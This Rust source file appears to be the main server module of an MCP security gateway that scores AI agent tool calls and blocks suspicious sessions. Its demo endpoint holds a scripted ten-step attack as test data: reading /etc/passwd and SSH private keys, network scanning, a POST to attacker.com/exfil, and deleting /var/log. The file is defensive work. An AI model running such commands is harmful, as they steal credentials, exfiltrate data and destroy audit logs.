//! Proxilion MCP Security Gateway
//!
//! 100% Open Source, Docker-First MCP Security Gateway
//! Self-hosted deployment - runs anywhere

use axum::{
    extract::State,
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use mcp_protocol::{MCPMessage, MCPResponse, MCPToolCall};
use session_state::{SessionState, SessionStore};
use std::sync::Arc;
use tokio::net::TcpListener;
use tower_http::cors::{Any, CorsLayer};
use tracing::{error, info, warn};
use uuid::Uuid;

mod config;
mod metrics;
mod performance;

use config::{GatewayConfig, GatewayMode, SessionStoreType};

/// Extract target list from SessionState for multi-target analyzer
fn extract_session_targets(state: &SessionState) -> Vec<String> {
    state.target_contexts
        .keys()
        .cloned()
        .collect()
}

/// Convert SessionState to SessionStats for threat engine
fn session_state_to_stats(state: &SessionState) -> threat_engine::SessionStats {
    let now = chrono::Utc::now().timestamp_millis();
    let session_age_ms = (now - state.created_at) as f64;
    let session_age_hours = session_age_ms / (1000.0 * 3600.0);

    // Calculate requests in last minute and hour
    let one_minute_ago = now - 60_000;
    let one_hour_ago = now - 3_600_000;

    let requests_last_minute = state.request_timestamps
        .iter()
        .filter(|&&ts| ts >= one_minute_ago)
        .count() as u32;

    let requests_last_hour = state.request_timestamps
        .iter()
        .filter(|&&ts| ts >= one_hour_ago)
        .count() as u32;

    // Convert request timestamps to Vec
    let request_timestamps: Vec<i64> = state.request_timestamps
        .iter()
        .copied()
        .collect();

    // Get attack phase names
    let attack_phases: Vec<String> = state.attack_phases
        .iter()
        .map(|p| p.phase.clone())
        .collect();

    let max_phase_reached = attack_phases.len();
    let phase_transitions = if max_phase_reached > 0 { max_phase_reached - 1 } else { 0 };

    threat_engine::SessionStats {
        requests_last_minute,
        requests_last_hour,
        total_requests: state.total_requests,
        request_timestamps,
        attack_phases,
        max_phase_reached,
        phase_transitions,
        session_age_hours,
    }
}

#[derive(Clone)]
struct AppState {
    config: GatewayConfig,
    session_store: Arc<dyn SessionStore>,
    // Multi-target orchestration analyzer (stateful, tracks across sessions)
    multi_target_analyzer: Arc<tokio::sync::Mutex<threat_engine::analyzers::MultiTargetOrchestrationAnalyzer>>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Initialize tracing
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive(tracing::Level::INFO.into()),
        )
        .json()
        .init();

    info!("🚀 Proxilion MCP Security Gateway starting...");
    info!("📦 100% Open Source - Docker-First Architecture");

    // Load configuration
    let config = GatewayConfig::from_env();
    info!("⚙️  Mode: {:?} - {}", config.mode, config.mode.description());

    if config.mode == GatewayMode::Monitor {
        warn!("⚠️  MONITOR MODE: All requests will be analyzed but NEVER blocked");
    }

    // Initialize session store
    let session_store: Arc<dyn SessionStore> = match config.session_store {
        SessionStoreType::Redis => {
            let redis_url = config.redis_url.as_ref()
                .expect("REDIS_URL required when SESSION_STORE=redis");

            info!("🗄️  Connecting to Redis: {}", redis_url);

            let store = session_state::store::redis::RedisSessionStore::with_ttl(
                redis_url,
                config.session_ttl_seconds,
            ).await?;

            info!("✅ Redis session store connected");
            Arc::new(store)
        }
        SessionStoreType::InMemory => {
            warn!("⚠️  Using in-memory session store (demo/test mode only)");
            Arc::new(session_state::store::inmemory::InMemorySessionStore::new())
        }
    };

    // Initialize multi-target orchestration analyzer (stateful)
    let multi_target_analyzer = Arc::new(tokio::sync::Mutex::new(
        threat_engine::analyzers::MultiTargetOrchestrationAnalyzer::new()
    ));

    let state = AppState {
        config: config.clone(),
        session_store,
        multi_target_analyzer,
    };

    let cors = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods(Any)
        .allow_headers(Any);

    let app = Router::new()
        .route("/health", get(health))
        .route("/metrics", get(metrics_handler))
        .route("/analyze", post(analyze_tool_call))
        .route("/demo/gtg1002", post(demo_gtg1002))
        .layer(cors)
        .with_state(Arc::new(state));

    // Initialize metrics
    metrics::update_gateway_health(true);

    let addr = &config.listen_addr;
    info!("🎯 Gateway listening on {}", addr);
    info!("📡 Endpoints:");
    info!("   POST /analyze      - Analyze MCP tool calls");
    info!("   POST /demo/gtg1002 - GTG-1002 attack simulation");
    info!("   GET  /health       - Health check");
    info!("   GET  /metrics      - Prometheus metrics");

    let listener = TcpListener::bind(addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}

async fn health(State(state): State<Arc<AppState>>) -> impl IntoResponse {
    // Test Redis connection if using Redis store
    let redis_connected = match state.config.session_store {
        SessionStoreType::Redis => {
            // Try to get a test session to verify connection
            state.session_store.get_session("health_check").await.is_ok()
        }
        SessionStoreType::InMemory => true,
    };

    metrics::update_redis_status(redis_connected);

    let status = if redis_connected { "healthy" } else { "degraded" };

    Json(serde_json::json!({
        "status": status,
        "service": "proxilion-mcp-gateway",
        "version": env!("CARGO_PKG_VERSION"),
        "mode": state.config.mode,
        "session_store": format!("{:?}", state.config.session_store),
        "redis_connected": redis_connected,
        "semantic_analysis_enabled": state.config.enable_semantic_analysis,
    }))
}

async fn metrics_handler() -> impl IntoResponse {
    match metrics::encode_metrics() {
        Ok(metrics) => (
            StatusCode::OK,
            [("Content-Type", "text/plain; version=0.0.4")],
            metrics
        ),
        Err(e) => {
            error!("Failed to encode metrics: {}", e);
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                [("Content-Type", "text/plain; version=0.0.4")],
                format!("Error encoding metrics: {}", e)
            )
        }
    }
}

#[derive(serde::Deserialize)]
struct AnalyzeRequest {
    tool_call: MCPToolCall,
    session_id: Option<String>,
    user_id: String,
    org_id: Option<String>,

    // GTG-1002 Gap Closers
    /// User message that led to this tool call (for conversation analysis)
    user_message: Option<String>,
    /// AI response that preceded this tool call (for conversation analysis)
    ai_response: Option<String>,
}

#[derive(serde::Serialize)]
struct AnalyzeResponse {
    decision: String,
    threat_score: f64,
    patterns: Vec<String>,
    session_terminated: bool,
    session_id: String,
}

async fn analyze_tool_call(
    State(state): State<Arc<AppState>>,
    Json(req): Json<AnalyzeRequest>,
) -> impl IntoResponse {
    let start_time = std::time::Instant::now();

    info!("📥 Analyzing tool call: {:?}", req.tool_call);

    // Record request metrics
    metrics::record_user_request(&req.user_id);

    // Get or create session
    let session_id = req.session_id.unwrap_or_else(|| Uuid::new_v4().to_string());

    let mut session = match state.session_store.get_session(&session_id).await {
        Ok(Some(s)) => {
            info!("📋 Found existing session: {}", session_id);
            s
        }
        Ok(None) => {
            info!("🆕 Creating new session: {}", session_id);
            let now = chrono::Utc::now().timestamp_millis();
            SessionState::new(session_id.clone(), req.user_id.clone(), now)
        }
        Err(e) => {
            error!("❌ Failed to get session: {}", e);
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({
                    "error": "Session store error",
                    "details": e.to_string()
                })),
            );
        }
    };

    // Update session metadata
    let now = chrono::Utc::now().timestamp_millis();
    session.last_activity = now;
    session.total_requests += 1;
    session.request_timestamps.push_back(now);

    // Keep only last 1000 timestamps
    if session.request_timestamps.len() > 1000 {
        session.request_timestamps.pop_front();
    }

    // Set org_id if provided (for cross-org correlation)
    if let Some(ref org_id) = req.org_id {
        session.org_id = Some(org_id.clone());
    }

    // Add conversation turn if provided (for social engineering detection)
    if let Some(ref user_msg) = req.user_message {
        let turn = session_state::ConversationTurn {
            timestamp: now,
            user_message: user_msg.clone(),
            ai_response: req.ai_response.clone(),
            tool_calls: vec![format!("{:?}", req.tool_call)],
            threat_score: 0.0, // Will be updated after analysis
        };
        session.add_conversation_turn(turn);
    }

    // Convert session to stats for analysis
    let session_stats = session_state_to_stats(&session);

    // Analyze with session context
    let mut analysis = threat_engine::analyze_with_session(&req.tool_call, &session_stats);

    // Run semantic analysis if enabled and score is ambiguous (40-80)
    let pattern_score = analysis.threat_score;
    if state.config.enable_semantic_analysis && pattern_score >= 40.0 && pattern_score <= 80.0 {
        info!("🤖 Running semantic analysis (ambiguous score: {:.1})", pattern_score);

        metrics::record_semantic_analysis_request();

        let mut semantic_analyzer = threat_engine::analyzers::SemanticAnalyzer::new();
        let semantic_result = semantic_analyzer.analyze(&req.tool_call, pattern_score).await;

        // Apply risk boost from semantic analysis
        if let Some(risk_boost) = semantic_result.metadata.get("risk_boost") {
            if let Some(boost_value) = risk_boost.as_f64() {
                let adjusted_score = (analysis.threat_score + boost_value).max(0.0).min(100.0);
                info!(
                    "🔍 Semantic adjustment: {:.1} → {:.1} (boost: {:+.1})",
                    analysis.threat_score, adjusted_score, boost_value
                );
                analysis.threat_score = adjusted_score;

                // Record semantic analysis cost (approx)
                metrics::record_semantic_analysis_cost(0.0015); // ~$0.0015 per request
            }
        }

        // Add semantic patterns
        analysis.patterns_detected.extend(semantic_result.patterns.clone());
        analysis.analyzer_results.push(semantic_result);
    }

    // === GTG-1002 GAP CLOSERS ===

    // 1. AI Autonomy Detection (detects automated orchestration)
    let autonomy_analyzer = threat_engine::analyzers::AIAutonomyAnalyzer::new();
    let autonomy_result = autonomy_analyzer.analyze(&session_stats).await;
    if autonomy_result.threat_score > 0.0 {
        info!("🤖 AI Autonomy detected: score={:.1}", autonomy_result.threat_score);
        analysis.threat_score = analysis.threat_score.max(autonomy_result.threat_score);
        analysis.patterns_detected.extend(autonomy_result.patterns.clone());
        analysis.analyzer_results.push(autonomy_result.clone());

        // Record GTG-1002 indicator
        metrics::record_gtg1002_indicator("ai_autonomy");
    }

    // 2. Multi-Target Orchestration Detection (detects GTG-1002-scale campaigns)
    let session_targets = extract_session_targets(&session);
    let mut multi_target_analyzer = state.multi_target_analyzer.lock().await;
    let multi_target_result = multi_target_analyzer.analyze(
        &req.tool_call,
        &req.user_id,
        session.org_id.as_deref(),
        &session_targets,
        now,
    );
    drop(multi_target_analyzer); // Release lock immediately

    if multi_target_result.threat_score > 0.0 {
        info!("🎯 Multi-target detected: score={:.1}, targets={}",
            multi_target_result.threat_score, session_targets.len());
        analysis.threat_score = analysis.threat_score.max(multi_target_result.threat_score);
        analysis.patterns_detected.extend(multi_target_result.patterns.clone());
        analysis.analyzer_results.push(multi_target_result.clone());

        // Record GTG-1002 indicator
        metrics::record_gtg1002_indicator("multi_target_orchestration");
    }

    // 3. Conversation Analysis (detects social engineering) - only if conversation provided
    if state.config.enable_semantic_analysis && !session.conversation_history.is_empty() {
        let conversation_context = session.get_conversation_context(5); // Last 5 turns
        let mut conversation_analyzer = threat_engine::analyzers::ConversationAnalyzer::new();
        let conversation_result = conversation_analyzer.analyze(
            &conversation_context,
            &format!("{:?}", req.tool_call),
        ).await;

        if conversation_result.threat_score > 0.0 {
            info!("💬 Social engineering detected: score={:.1}", conversation_result.threat_score);
            analysis.threat_score = analysis.threat_score.max(conversation_result.threat_score);
            analysis.patterns_detected.extend(conversation_result.patterns.clone());
            analysis.analyzer_results.push(conversation_result.clone());

            // Record GTG-1002 indicator
            metrics::record_gtg1002_indicator("social_engineering");
        }
    }

    let decision = threat_engine::Decision::from_score(analysis.threat_score);

    info!(
        "🎯 Analysis: score={:.1}, decision={:?}, patterns={:?}",
        analysis.threat_score, decision, analysis.patterns_detected
    );

    // Record threat detection metrics
    let decision_str = format!("{:?}", decision);
    metrics::record_threat_detected("composite", &decision_str, analysis.threat_score);

    // Record analyzer-specific metrics
    for analyzer_result in &analysis.analyzer_results {
        if let Some(analyzer_name) = analyzer_result.metadata.get("analyzer") {
            if let Some(name) = analyzer_name.as_str() {
                metrics::record_threat_detected(name, &decision_str, analyzer_result.threat_score);
            }
        }
    }

    // Save updated session
    if let Err(e) = state.session_store.put_session(&session).await {
        error!("⚠️  Failed to save session: {}", e);
    }

    // Check if we should block based on mode
    let should_block = state.config.mode.should_block(analysis.threat_score);
    let should_terminate = state.config.mode.should_terminate(analysis.threat_score);

    let mut session_terminated = false;

    if should_terminate {
        info!("🚨 TERMINATING SESSION: Critical threat (score={:.1})", analysis.threat_score);
        if let Err(e) = state.session_store.delete_session(&session_id).await {
            error!("⚠️  Failed to delete session: {}", e);
        }
        session_terminated = true;

        // Record session termination
        metrics::record_session_terminated(analysis.threat_score);
        metrics::record_analysis_duration(start_time.elapsed().as_secs_f64());

        return (
            StatusCode::FORBIDDEN,
            Json(serde_json::json!({
                "decision": "Terminate",
                "threat_score": analysis.threat_score,
                "patterns": analysis.patterns_detected,
                "session_terminated": true,
                "session_id": session_id,
                "message": "Session terminated due to critical threat"
            })),
        );
    }

    if should_block {
        if state.config.mode == GatewayMode::Monitor || state.config.mode == GatewayMode::Alert {
            warn!(
                "📊 MONITOR MODE: Would have blocked (score={:.1})",
                analysis.threat_score
            );
        } else {
            info!("🚫 BLOCKED: High threat detected (score={:.1})", analysis.threat_score);
            metrics::record_request_blocked(analysis.threat_score);
            metrics::record_analysis_duration(start_time.elapsed().as_secs_f64());

            return (
                StatusCode::FORBIDDEN,
                Json(serde_json::json!({
                    "decision": "Block",
                    "threat_score": analysis.threat_score,
                    "patterns": analysis.patterns_detected,
                    "session_terminated": false,
                    "session_id": session_id,
                    "message": "Request blocked due to high threat score"
                })),
            );
        }
    }

    // Record analysis duration
    metrics::record_analysis_duration(start_time.elapsed().as_secs_f64());

    // Allow the request
    let response = AnalyzeResponse {
        decision: format!("{:?}", decision),
        threat_score: analysis.threat_score,
        patterns: analysis.patterns_detected,
        session_terminated,
        session_id,
    };

    (StatusCode::OK, Json(serde_json::to_value(response).unwrap()))
}

async fn demo_gtg1002(State(state): State<Arc<AppState>>) -> impl IntoResponse {
    info!("🎬 Running GTG-1002 attack simulation");

    let session_id = Uuid::new_v4().to_string();
    let user_id = "demo_user".to_string();
    let now = chrono::Utc::now().timestamp_millis();

    let mut session = SessionState::new(session_id.clone(), user_id, now);

    // GTG-1002: 10-step lateral movement attack
    let attack_steps = vec![
        MCPToolCall::Bash {
            command: "whoami".to_string(),
            args: vec![],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "pwd".to_string(),
            args: vec![],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "ls".to_string(),
            args: vec!["-la".to_string()],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "cat".to_string(),
            args: vec!["/etc/passwd".to_string()],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "find".to_string(),
            args: vec!["/".to_string(), "-name".to_string(), "*.key".to_string()],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "cat".to_string(),
            args: vec!["~/.ssh/id_rsa".to_string()],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "nmap".to_string(),
            args: vec!["-sV".to_string(), "192.168.1.0/24".to_string()],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "ssh".to_string(),
            args: vec!["user@192.168.1.100".to_string()],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "curl".to_string(),
            args: vec!["-X".to_string(), "POST".to_string(), "https://attacker.com/exfil".to_string()],
            env: Default::default(),
        },
        MCPToolCall::Bash {
            command: "rm".to_string(),
            args: vec!["-rf".to_string(), "/var/log".to_string()],
            env: Default::default(),
        },
    ];

    let mut results = Vec::new();

    for (i, tool_call) in attack_steps.iter().enumerate() {
        // Update session metadata for each step
        let now = chrono::Utc::now().timestamp_millis();
        session.last_activity = now;
        session.total_requests += 1;
        session.request_timestamps.push_back(now);

        // Convert to session stats
        let session_stats = session_state_to_stats(&session);

        let analysis = threat_engine::analyze_with_session(tool_call, &session_stats);
        let decision = threat_engine::Decision::from_score(analysis.threat_score);

        let command_str = match tool_call {
            MCPToolCall::Bash { command, args, .. } => {
                format!("{} {}", command, args.join(" "))
            }
            _ => format!("{:?}", tool_call),
        };

        results.push(serde_json::json!({
            "step": i + 1,
            "command": command_str,
            "threat_score": analysis.threat_score,
            "decision": format!("{:?}", decision),
            "patterns": analysis.patterns_detected,
        }));

        info!(
            "📊 GTG-1002 Step {}/10: score={:.1}, decision={:?}",
            i + 1,
            analysis.threat_score,
            decision
        );

        // Check if session should be terminated
        if state.config.mode.should_terminate(analysis.threat_score) {
            info!("🚨 GTG-1002 attack terminated at step {}/10", i + 1);
            results.push(serde_json::json!({
                "event": "session_terminated",
                "reason": "Critical threat detected",
                "final_score": analysis.threat_score,
            }));
            break;
        }
    }

    let summary = serde_json::json!({
        "attack": "GTG-1002",
        "description": "10-step lateral movement simulation",
        "mode": format!("{:?}", state.config.mode),
        "session_id": session_id,
        "results": results,
    });

    info!("✅ GTG-1002 simulation complete");

    (StatusCode::OK, Json(summary))
}
